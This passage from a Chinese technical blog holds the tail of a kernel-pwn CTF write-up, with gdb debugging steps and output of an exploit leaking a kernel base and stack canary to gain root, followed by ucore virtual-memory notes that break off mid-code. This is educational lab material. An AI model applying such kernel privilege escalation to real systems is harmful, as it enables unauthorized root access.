<h2 id="debugging"><a href="#debugging" class="headerlink" title="debugging"></a>debugging</h2><p>target remote:1234&#x901A;&#x8FC7;&#x7AEF;&#x53E3;&#x8C03;&#x8BD5;&#xFF0C;gdb ./vmlinux&#x542F;&#x52A8;&#xFF0C;&#x53EA;&#x52A0;&#x8F7D;&#x4E86; kernel &#x7684;&#x7B26;&#x53F7;&#x8868;&#xFF0C;&#x6A21;&#x5757;&#x52A0;&#x8F7D;&#x8FDB;&#x5185;&#x6838;&#x540E;&#xFF0C;&#x5E76;&#x6CA1;&#x6709;&#x4F5C;&#x4E3A;vmliunx&#x7684;&#x4E00;&#x90E8;&#x5206;&#x4F20;&#x7ED9;gdb&#xFF0C;&#x56E0;&#x4E3A;&#x9700;&#x8981;&#x52A0;&#x8F7D;&#x5185;&#x6838;&#x6A21;&#x5757;&#x7684;&#x7B26;&#x53F7;&#x8868;&#xFF0C;&#x7531;&#x4E8E;&#x6A21;&#x5757;&#x4E5F;&#x662F;&#x4E00;&#x4E2A;ELF&#x6587;&#x4EF6;&#xFF0C;&#x9700;&#x8981;&#x77E5;&#x9053;&#x6A21;&#x5757;&#x7684;.text&#x7684;&#x8282;&#x533A;&#x5730;&#x5740;&#x3002;&#x8FD9;&#x4E2A;&#x4FE1;&#x606F;&#x5206;&#x522B;&#x4FDD;&#x5B58;/sys/module/stack_smashing/sections/.text&#x4E2D;</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb ./vmlinux</span><br><span class="line">target remote:1234 </span><br><span class="line">add-symbol-file ./core.ko textaddr</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/ $ id</span><br><span class="line">uid=1000(chal) gid=1000(chal) groups=1000(chal)</span><br><span class="line">/ $ /tmp/exploit </span><br><span class="line">[*]status has been saved.</span><br><span class="line">vmlinux_base 0xffffffff92800000</span><br><span class="line">vmlinux_base 0xffffffff92800000</span><br><span class="line">[*] <span class="built_in">set</span> off</span><br><span class="line">[*] core_read</span><br><span class="line">[+]canary: 0x808226e1f3461f00</span><br><span class="line">/ $ id</span><br><span class="line">uid=0(root) gid=0(root)</span><br></pre></td></tr></table></figure>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/10/06/mineucore-虚拟内存管理学习笔记/">mineucore-虚拟内存管理学习笔记</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-10-06</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/OS/">OS</a></span><div class="content"><h2 id="&#x6982;&#x8FF0;"><a href="#&#x6982;&#x8FF0;" class="headerlink" title="&#x6982;&#x8FF0;"></a>&#x6982;&#x8FF0;</h2><p>&#x865A;&#x62DF;&#x9875;&#x5F0F;&#x5B58;&#x50A8;&#x6280;&#x672F;&#xFF0C;&#x5728;&#x9875;&#x5F0F;&#x5B58;&#x50A8;&#x7BA1;&#x7406;&#x7684;&#x57FA;&#x7840;&#x4E0A;&#xFF0C;&#x589E;&#x52A0;&#x8BF7;&#x6C42;&#x8C03;&#x9875;&#x548C;&#x9875;&#x9762;&#x7F6E;&#x6362;</p>
<p>&#x6709;&#x4E86;&#x9875;&#x5F0F;&#x5185;&#x5B58;&#x7BA1;&#x7406;&#x6280;&#x672F;&#xFF0C;CPU&#x4F7F;&#x7528;&#x7684;&#x5730;&#x5740;&#x5DF2;&#x7ECF;&#x4E0D;&#x662F;&#x5B9E;&#x9645;&#x7684;&#x7269;&#x7406;&#x5730;&#x5740;&#x4E86;&#xFF0C;&#x800C;&#x662F;&#x865A;&#x62DF;&#x5730;&#x5740;&#xFF0C;&#x8FDB;&#x800C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x8BBE;&#x7F6E;&#x6BB5;&#x754C;&#x9650;&#x6216;&#x9875;&#x8868;&#x9879;&#x6765;&#x8BBE;&#x5B9A;&#x7A0B;&#x5E8F;&#x8FD0;&#x884C;&#x65F6;&#x7684;&#x8BBF;&#x95EE;&#x7A7A;&#x95F4;&#xFF0C;&#x786E;&#x4FDD;&#x7A0B;&#x5E8F;&#x8FD0;&#x884C;&#x4E0D;&#x8D8A;&#x754C;&#xFF0C;&#x5B8C;&#x6210;&#x5185;&#x5B58;&#x8BBF;&#x95EE;&#x4FDD;&#x62A4;&#x7684;&#x529F;&#x80FD;&#x3002;</p>
<p>&#x4F46;&#x662F;&#x60F3;&#x6700;&#x5927;&#x5316;&#x5229;&#x7528;&#x7269;&#x7406;&#x5185;&#x5B58;&#xFF0C;&#x6839;&#x636E;&#x7A0B;&#x5E8F;&#x7684;&#x5C40;&#x90E8;&#x6027;&#x539F;&#x7406;&#xFF0C;&#x5373;&#x7A0B;&#x5E8F;&#x5728;&#x6267;&#x884C;&#x8FC7;&#x7A0B;&#x4E2D;&#x7684;&#x4E00;&#x4E2A;&#x8F83;&#x77ED;&#x7684;&#x65F6;&#x671F;&#x5185;&#xFF0C;&#x6240;&#x6267;&#x884C;&#x7684;&#x6307;&#x4EE4;&#x5730;&#x5740;&#x548C;&#x6307;&#x4EE4;&#x64CD;&#x4F5C;&#x6570;&#x5730;&#x5740;&#xFF0C;&#x5206;&#x522B;&#x5C40;&#x9650;&#x4E8E;&#x4E00;&#x5B9A;&#x533A;&#x57DF;&#x3002;&#x53EF;&#x4F7F;&#x7A0B;&#x5E8F;&#x5728;&#x6CA1;&#x6709;&#x8BBF;&#x95EE;&#x67D0;&#x4E2A;&#x865A;&#x62DF;&#x5730;&#x5740;&#x65F6;&#xFF0C;&#x4E0D;&#x5206;&#x914D;&#x7269;&#x7406;&#x5185;&#x5B58;&#xFF0C;&#x5F53;&#x7A0B;&#x5E8F;&#x8BBF;&#x95EE;&#x67D0;&#x4E2A;&#x865A;&#x62DF;&#x5730;&#x5740;&#x65F6;&#xFF0C;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x5728;&#x52A8;&#x6001;&#x7684;&#x5206;&#x914D;&#x5185;&#x5B58;&#xFF0C;&#x5728;&#x9875;&#x8868;&#x4E2D;&#x5EFA;&#x7ACB;&#x865A;&#x62DF;&#x5730;&#x5740;&#x5230;&#x7269;&#x7406;&#x5730;&#x5740;&#x7684;&#x6620;&#x5C04;&#x5173;&#x7CFB;&#xFF0C;&#x8FD9;&#x5C31;&#x662F;<strong>&#x6309;&#x9700;&#x5206;&#x9875;</strong>&#x3002;</p>
<p>&#x4F46;&#x662F;&#x7269;&#x7406;&#x5185;&#x5B58;&#x603B;&#x4F1A;&#x4F7F;&#x7528;&#x6B86;&#x5C3D;&#xFF0C;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x53EF;&#x4EE5;&#x5C06;&#x7A0B;&#x5E8F;&#x5185;&#x5B58;&#x7A7A;&#x95F4;&#x4E2D;&#x4E0D;&#x7ECF;&#x5E38;&#x8BBF;&#x95EE;&#x7684;&#x6570;&#x636E;&#x653E;&#x5165;&#x5916;&#x5B58;&#x4E2D;&#xFF0C;&#x5E76;&#x5728;&#x9875;&#x8868;&#x9879;&#x4E2D;&#x6807;&#x8BB0;&#xFF0C;&#x5F53;&#x53D1;&#x751F;&#x7F3A;&#x9875;&#x5F02;&#x5E38;&#x65F6;&#xFF0C;&#x5C31;&#x628A;&#x5916;&#x5B58;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x91CD;&#x65B0;&#x52A0;&#x8F7D;&#x8FDB;&#x5185;&#x5B58;&#x4E2D;&#xFF0C;&#x8FD9;&#x662F;<strong>&#x9875;&#x6362;&#x5165;&#x6362;&#x51FA;&#xFF08;page swap in/out&#xFF09;</strong>&#x6280;&#x672F;&#x3002;&#x5982;&#x4F55;&#x9009;&#x62E9;&#x7269;&#x7406;&#x9875;&#x653E;&#x5165;&#x5916;&#x5B58;&#x4E2D;&#xFF0C;&#x8FD9;&#x5C31;&#x662F;<strong>&#x9875;&#x9762;&#x7F6E;&#x6362;&#x7B97;&#x6CD5;</strong>&#x7684;&#x5DE5;&#x4F5C;&#x4E86;&#x3002;</p>
<p>&#x5F53;&#x4E24;&#x4E2A;&#x865A;&#x62DF;&#x9875;&#x7684;&#x6570;&#x636E;&#x5185;&#x5BB9;&#x76F8;&#x540C;&#x65F6;&#xFF0C;&#x53EF;&#x53EA;&#x5206;&#x914D;&#x4E00;&#x4E2A;&#x7269;&#x7406;&#x9875;&#x6846;&#xFF0C;&#x8FD9;&#x6837;&#x5982;&#x679C;&#x5BF9;&#x4E24;&#x4E2A;&#x865A;&#x62DF;&#x9875;&#x7684;&#x8BBF;&#x95EE;&#x65B9;&#x5F0F;&#x662F;&#x53EA;&#x8BFB;&#x65B9;&#x5F0F;&#xFF0C;&#x8FD9;&#x4E24;&#x4E2A;&#x865A;&#x62DF;&#x9875;&#x53EF;&#x5171;&#x4EAB;&#x9875;&#x6846;&#xFF0C;&#x8282;&#x7701;&#x5185;&#x5B58;&#x7A7A;&#x95F4;&#xFF1B;&#x5982;&#x679C;CPU&#x5BF9;&#x5176;&#x4E2D;&#x4E4B;&#x4E00;&#x7684;&#x865A;&#x62DF;&#x9875;&#x8FDB;&#x884C;&#x5199;&#x64CD;&#x4F5C;&#xFF0C;&#x5219;&#x8FD9;&#x4E24;&#x4E2A;&#x865A;&#x62DF;&#x9875;&#x7684;&#x6570;&#x636E;&#x5185;&#x5BB9;&#x4F1A;&#x4E0D;&#x540C;&#xFF0C;&#x9700;&#x8981;&#x5206;&#x914D;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x7269;&#x7406;&#x9875;&#x6846;&#xFF0C;&#x5E76;&#x5C06;&#x7269;&#x7406;&#x9875;&#x6846;&#x6807;&#x8BB0;&#x4E3A;&#x53EF;&#x5199;&#xFF0C;&#x8FD9;&#x6837;&#x4E24;&#x4E2A;&#x865A;&#x62DF;&#x9875;&#x9762;&#x5C06;&#x6620;&#x5C04;&#x5230;&#x4E0D;&#x540C;&#x7684;&#x7269;&#x7406;&#x9875;&#x5E27;&#xFF0C;&#x786E;&#x4FDD;&#x6574;&#x4E2A;&#x5185;&#x5B58;&#x7A7A;&#x95F4;&#x7684;&#x6B63;&#x786E;&#x8BBF;&#x95EE;&#x3002;&#x8FD9;&#x79CD;&#x6280;&#x672F;&#x79F0;&#x4E3A;<strong>&#x5199;&#x65F6;&#x590D;&#x5236;&#xFF08;Copy On Write&#xFF0C;&#x7B80;&#x79F0;COW&#xFF09;</strong>&#x3002;</p>
<p>&#x4E0B;&#x9762;&#x4E3B;&#x8981;&#x5728;&#x7269;&#x7406;&#x5185;&#x5B58;&#x7BA1;&#x7406;&#x548C;&#x4E2D;&#x65AD;&#x5F02;&#x5E38;&#x7684;&#x57FA;&#x7840;&#x4E0A;&#x5B8C;&#x6210;&#x4E0A;&#x9762;&#x7684;&#x4E09;&#x4E2A;&#x5185;&#x5BB9;&#x3002;</p>
<h2 id="&#x6309;&#x9700;&#x5206;&#x9875;&#x4E0E;FIFO&#x9875;&#x9762;&#x7F6E;&#x6362;&#x7B97;&#x6CD5;"><a href="#&#x6309;&#x9700;&#x5206;&#x9875;&#x4E0E;FIFO&#x9875;&#x9762;&#x7F6E;&#x6362;&#x7B97;&#x6CD5;" class="headerlink" title="&#x6309;&#x9700;&#x5206;&#x9875;&#x4E0E;FIFO&#x9875;&#x9762;&#x7F6E;&#x6362;&#x7B97;&#x6CD5;"></a>&#x6309;&#x9700;&#x5206;&#x9875;&#x4E0E;FIFO&#x9875;&#x9762;&#x7F6E;&#x6362;&#x7B97;&#x6CD5;</h2><p>&#x5728;&#x7269;&#x7406;&#x5185;&#x5B58;&#x65B9;&#x9762;&#xFF0C;&#x4F7F;&#x7528;Page&#x7ED3;&#x6784;&#x4F53;&#x7BA1;&#x7406;&#x6240;&#x6709;&#x7269;&#x7406;&#x5185;&#x5B58;&#xFF0C;&#x6BCF;&#x4E00;&#x4E2A;&#x7269;&#x7406;&#x5E27;&#xFF0C;&#x90FD;&#x5BF9;&#x5E94;&#x4E00;&#x4E2A;Page&#x7ED3;&#x6784;&#x4F53;&#x3002;Page&#x7ED3;&#x6784;&#x4F53;&#x4FDD;&#x5B58;&#x5728;ucore&#x7CFB;&#x7EDF;&#x7684;&#x7269;&#x7406;&#x5185;&#x5B58;&#x4E0A;&#x65B9;&#x3002;&#x4E3A;&#x4E86;&#x5B9E;&#x73B0;&#x9875;&#x9762;&#x7F6E;&#x6362;&#x7B97;&#x6CD5;&#xFF0C;&#x5728;Page&#x7ED3;&#x6784;&#x4F53;&#x672B;&#x5C3E;&#xFF0C;&#x6DFB;&#x52A0;&#x4E86;&#x4E24;&#x4E2A;&#x65B0;&#x7684;&#x6210;&#x5458;&#x3002;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Page</span> {</span></span><br><span class="line">    <span class="keyword">int</span> ref; <span class="comment">//&#x8BE5;&#x7269;&#x7406;&#x5E27;&#x88AB;&#x7EBF;&#x6027;&#x5730;&#x5740;&#x5F15;&#x7528;&#x7684;&#x6B21;&#x6570;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> flags; <span class="comment">//&#x63CF;&#x8FF0;&#x9875;&#x9762;&#x5C5E;&#x6027;&#x7684;&#x6807;&#x5FD7;&#x4F4D;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> property; <span class="comment">//&#x63CF;&#x8FF0;&#x8FDE;&#x7EED;&#x7A7A;&#x95F2;&#x5757;&#x7684;&#x6570;&#x91CF;</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> page_link; <span class="comment">//&#x7528;&#x4E8E;&#x4E32;&#x8054;&#x7A7A;&#x95F2;&#x5757;&#x53CC;&#x5411;&#x94FE;&#x8868;&#x7684;&#x94FE;&#x63A5;&#x7ED3;&#x6784;</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> pra_page_link; <span class="comment">//&#x7528;&#x6765;&#x6784;&#x9020;&#x6309;&#x9875;&#x7684;&#x7B2C;&#x4E00;&#x6B21;&#x8BBF;&#x95EE;&#x65F6;&#x95F4;&#x8FDB;&#x884C;&#x6392;&#x5E8F;&#x7684;&#x4E00;&#x4E2A;&#x94FE;&#x8868;&#xFF0C;&#x8868;&#x5934;&#x65F6;&#x95F4;&#x6700;&#x8FD1;&#xFF0C;&#x8868;&#x5C3E;&#x65F6;&#x95F4;&#x6700;&#x8FDC;</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> pra_vaddr; <span class="comment">//&#x7528;&#x6765;&#x8BB0;&#x5F55;&#x6B64;&#x7269;&#x7406;&#x9875;&#x5BF9;&#x5E94;&#x7684;&#x865A;&#x62DF;&#x9875;&#x8D77;&#x59CB;&#x5730;&#x5740;</span></span><br><span class="line">};</span><br></pre></td></tr></table></figure>
<p>pra_page_link&#x8FD9;&#x4E2A;&#x53CC;&#x5411;&#x94FE;&#x8868;&#x4E5F;&#x662F;&#x6709;&#x5934;&#x7ED3;&#x70B9;&#x7684;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//swap_info.c</span></span><br><span class="line"><span class="keyword">list_entry_t</span> pra_list_head;<span class="comment">//&#x505A;&#x4E3A;&#x5934;&#x7ED3;&#x70B9;&#xFF0C;&#x7528;&#x53CC;&#x5411;&#x94FE;&#x8868;&#x5404;&#x7528;&#x5230;&#x7684;&#x9875;&#x6846;Page&#x7ED3;&#x6784;&#x4F53;&#xFF0C;&#x6309;&#x7167;&#x65F6;&#x95F4;&#x987A;&#x5E8F;&#xFF0C;&#x4F7F;&#x7528;&#x65F6;&#x5F53;&#x6210;&#x961F;&#x5217;&#x6570;&#x636E;&#x7ED3;&#x6784;&#x4F7F;&#x7528;</span></span><br></pre></td></tr></table></figure>
<p>&#x4F46;&#x662F;&#x5BF9;&#x4E8E;&#x7528;&#x6237;&#x6001;&#x7684;&#x7A0B;&#x5E8F;&#x6765;&#x8BF4;&#xFF0C;&#x9700;&#x8981;&#x6709;&#x76F8;&#x5173;&#x7684;&#x6570;&#x636E;&#x7ED3;&#x6784;&#x548C;&#x64CD;&#x4F5C;&#x6765;&#x4F53;&#x73B0;&#x4E00;&#x822C;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x5BF9;&#x865A;&#x62DF;&#x5185;&#x5B58;&#x7684;&#x201C;&#x9700;&#x6C42;&#x201D;&#x3002;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> {</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> mmap_list; <span class="comment">//&#x8FDE;&#x63A5;vma_struct&#x7684;&#x53CC;&#x5411;&#x94FE;&#x8868;&#x7684;&#x5934;&#x7ED3;&#x70B9;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vma_struct</span> *<span class="title">mmap_cache</span>;</span> <span class="comment">//&#x6307;&#x5411;&#x5F53;&#x524D;&#x6B63;&#x5728;&#x4F7F;&#x7528;&#x7684;vma&#x7ED3;&#x6784;&#xFF0C;&#x7528;&#x4E8E;&#x63D0;&#x901F;</span></span><br><span class="line">    <span class="keyword">pde_t</span> *pgdir; <span class="comment">//&#x6307;&#x5411;&#x5F53;&#x524D;mm&#x6570;&#x636E;&#x7ED3;&#x6784;&#x6240;&#x7EF4;&#x62A4;&#x7684;&#x9875;&#x76EE;&#x5F55;&#x8868;</span></span><br><span class="line">    <span class="keyword">int</span> map_count; <span class="comment">//&#x5176;&#x94FE;&#x63A5;&#x7684;vma_struct&#x7684;&#x6570;&#x91CF;</span></span><br><span class="line">    <span class="keyword">void</span> *sm_priv; <span class="comment">//&#x6307;&#x5411;&#x7528;&#x6765;&#x94FE;&#x63A5;&#x8BB0;&#x5F55;&#x9875;&#x8BBF;&#x95EE;&#x60C5;&#x51B5;&#x7684;&#x94FE;&#x8868;&#x5934;</span></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vma_struct</span> {</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">vm_mm</span>;</span> <span class="comment">//&#x6307;&#x5411;&#x5934;mm&#x7ED3;&#x6784;</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> vm_start; <span class="comment">//&#x865A;&#x62DF;&#x5730;&#x5740;&#x7684;&#x8D77;&#x59CB;&#x5730;&#x5740;</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> vm_end; <span class="comment">//&#x865A;&#x62DF;&#x5730;&#x5740;&#x7684;&#x7ED3;&#x675F;&#x5730;&#x5740;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> vm_flags; <span class="comment">//&#x865A;&#x62DF;&#x7A7A;&#x95F4;&#x7684;&#x6807;&#x5FD7;&#x4F4D;</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> list_link; <span class="comment">//&#x53CC;&#x5411;&#x94FE;&#x8868;&#x7684;&#x8FDE;&#x63A5;&#x7ED3;&#x6784;&#xFF08;&#x6309;&#x7167;&#x5730;&#x5740;&#x6392;&#x5E8F;&#xFF09;</span></span><br><span class="line">};</span><br></pre></td></tr></table></figure>
<p>mm_struct&#x7EF4;&#x62A4;&#x4E00;&#x4E2A;&#x9875;&#x8868;&#x7684;&#x53EF;&#x7528;&#x7A7A;&#x95F2;&#x7A7A;&#x95F4;&#xFF0C;&#x5177;&#x4F53;&#x6765;&#x8BF4;&#x662F;&#x4E00;&#x4E2A;mm_struct&#x4E0B;&#x94FE;&#x63A5;&#x591A;&#x4E2A;vma_struct&#xFF0C;vma_struct&#x6807;&#x8BB0;&#x4E86;&#x8FD9;&#x4E2A;4M&#x7A7A;&#x95F4;&#x4E2D;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x7684;&#x865A;&#x62DF;&#x7A7A;&#x95F4;&#xFF0C;&#x5404;&#x4E2A;vma_struct&#x95F4;&#x901A;&#x8FC7;list_link&#x53CC;&#x5411;&#x94FE;&#x8868;&#x94FE;&#x63A5;&#xFF0C;&#x800C;mm_struct&#x5C31;&#x662F;&#x8FD9;&#x4E2A;&#x53CC;&#x5411;&#x94FE;&#x8868;&#x7684;&#x8868;&#x5934;&#x3002;</p>
<p>&#x5F53;&#x9875;&#x8868;&#x6620;&#x5C04;&#x5230;&#x7269;&#x7406;&#x5185;&#x5B58;&#x65F6;&#xFF0C;&#x9875;&#x8868;&#x5185;&#x5BB9;&#x4E3A;&#x9875;&#x5E27;&#x7684;&#x5730;&#x5740;&#x8FD8;&#x6709;&#x4E00;&#x4E9B;&#x6807;&#x5FD7;&#x4F4D;&#xFF0C;&#x4F46;&#x662F;&#x5F53;&#x865A;&#x62DF;&#x5185;&#x5B58;&#x6620;&#x5C04;&#x5230;&#x5916;&#x5B58;&#x65F6;&#xFF0C;&#x5176;&#x9875;&#x8868;&#x5185;&#x5BB9;&#x5982;&#x4F55;&#x8BBE;&#x8BA1;&#xFF1F;&#x5373;&#x5982;&#x4F55;&#x533A;&#x5206;&#x7269;&#x7406;&#x5185;&#x5B58;&#x7684;&#x6620;&#x5C04;&#x548C;swap&#x533A;&#x7684;&#x6620;&#x5C04;&#x3002;</p>
<p>&#x4E00;&#x4E2A;&#x9875;&#x5927;&#x5C0F;&#x4E3A;4kb&#xFF0C;&#x5F53;&#x6620;&#x5C04;&#x5230;&#x786C;&#x76D8;&#x4E2D;&#x65F6;&#xFF0C;&#x9700;&#x8981;&#x5360;&#x7528;8&#x4E2A;&#x6247;&#x533A;&#xFF08;0.5kb/&#x6247;&#x533A;&#xFF09;&#x3002;&#x53EF;&#x5C06;PTE&#xFF08;&#x9875;&#x8868;&#x9879;&#xFF09;&#x7684;&#x9AD8;24&#x4F4D;&#x8868;&#x793A;&#x5BF9;&#x6362;&#x5230;&#x786C;&#x76D8;&#x4E0A;&#x7684;&#x9875;&#x7684;&#x8D77;&#x59CB;&#x6247;&#x533A;&#x53F7;&#xFF0C;&#x5E76;&#x5C06;bit 0&#x7F6E;&#x4E3A;0&#xFF0C;&#x5373;&#x5F53;PTE&#x9AD8;24&#x4F4D;&#x4E0D;&#x4E3A;0&#xFF0C;&#x4E14;bit 0&#x4E3A;0&#xFF0C;&#x5219;&#x8BF4;&#x660E;&#x8BE5;&#x7269;&#x7406;&#x9875;&#x88AB;&#x6620;&#x5C04;&#x5230;&#x4E86;swap&#x533A;&#x3002;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">* <span class="keyword">swap_entry_t</span></span><br><span class="line">* --------------------------------------------</span><br><span class="line">* |         offset        |   reserved   | <span class="number">0</span> |</span><br><span class="line">* --------------------------------------------</span><br><span class="line">*           <span class="number">24</span> bits            <span class="number">7</span> bits    <span class="number">1</span> bit</span><br></pre></td></tr></table></figure>
<p>&#x7F3A;&#x9875;&#x4E2D;&#x65AD;&#x7684;&#x5904;&#x7406;&#x51FD;&#x6570;&#x4E3B;&#x8981;&#x662F;do_pgfault&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#xFF0C;&#x4E3B;&#x8981;&#x5305;&#x62EC;&#x4E24;&#x4E2A;&#x5206;&#x652F;&#xFF1A;1&#xFF09;&#x5F53;&#x53D1;&#x751F;&#x7F3A;&#x9875;&#x4E2D;&#x65AD;&#x65F6;&#xFF0C;&#x5982;&#x679C;&#x9875;&#x8868;&#x9879;&#x7684;&#x5185;&#x5BB9;&#x4E3A;0&#xFF0C;&#x5219;&#x8868;&#x793A;&#x53D1;&#x751F;&#x7F3A;&#x9875;&#x5F02;&#x5E38;&#xFF0C;&#x63A5;&#x4E0B;&#x6765;&#x4F1A;&#x8BF7;&#x6C42;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x7269;&#x7406;&#x9875;&#xFF0C;&#x7136;&#x540E;&#x66F4;&#x65B0;&#x9875;&#x8868;&#x5185;&#x5BB9;&#xFF0C;&#x5B8C;&#x6210;&#x6620;&#x5C04;&#x8FC7;&#x7A0B;&#x3002;2&#xFF09;&#x5982;&#x679C;&#x4E0D;&#x4E3A;0&#xFF0C;&#x5219;&#x4E3A;&#x662F;&#x4E00;&#x4E2A;&#x6620;&#x5C04;&#x5230;swap&#x533A;&#x7684;&#x7F3A;&#x9875;&#x5F02;&#x5E38;&#x3002;&#x5F53;&#x7136;&#x4E0D;&#x4F1A;&#x76F4;&#x63A5;&#x5230;&#x8FD9;&#x4E24;&#x4E2A;&#x5206;&#x652F;&#xFF0C;&#x8FD8;&#x9700;&#x8981;&#x6839;&#x636E;&#x9519;&#x8BEF;&#x53F7;&#xFF0C;&#x505A;&#x8FDB;&#x4E00;&#x6B65;&#x5224;&#x65AD;&#x3002;</p>
<p>&#x4E0B;&#x9762;&#x5B8C;&#x6574;&#x7684;do_pgfault&#x51FD;&#x6570;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//vmm.c</span></span><br><span class="line"><span class="comment">/* do_pgfault - &#x5904;&#x7406;&#x9875;&#x4E2D;&#x65AD;&#x5F02;&#x5E38;&#x7684;&#x4E3B;&#x8981;&#x51FD;&#x6570;</span></span><br><span class="line"><span class="comment"> * @mm         : &#x7BA1;&#x7406;&#x53EF;&#x7528;&#x865A;&#x62DF;&#x5185;&#x5B58;&#x7A7A;&#x95F4;&#x7684;&#x7ED3;&#x6784;&#x4F53;</span></span><br><span class="line"><span class="comment"> * @error_code : &#x5904;&#x7406;&#x5668;&#x629B;&#x51FA;&#x7684;&#x5F02;&#x5E38;&#x7801;</span></span><br><span class="line"><span class="comment"> * @addr       : CR2&#x5BC4;&#x5B58;&#x5668;&#x4FDD;&#x5B58;&#x7684;&#x53D1;&#x751F;&#x9875;&#x8BBF;&#x95EE;&#x9519;&#x8BEF;&#x7684;&#x7EBF;&#x6027;&#x5730;&#x5740;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">do_pgfault(struct mm_struct *mm, <span class="keyword">uint32_t</span> error_code, <span class="keyword">uintptr_t</span> addr) {</span><br><span class="line">    <span class="keyword">int</span> ret = -E_INVAL;</span><br><span class="line">    <span class="comment">//&#x67E5;&#x627E;&#x5305;&#x542B;&#x7F3A;&#x9875;&#x5F02;&#x5E38;addr&#x7684;vma</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vma_struct</span> *<span class="title">vma</span> = <span class="title">find_vma</span>(<span class="title">mm</span>, <span class="title">addr</span>);</span><span class="comment">//&#x5728;&#x6D4B;&#x8BD5;&#x4E2D; addr = 100h</span></span><br><span class="line"></span><br><span class="line">    pgfault_num++;</span><br><span class="line">    <span 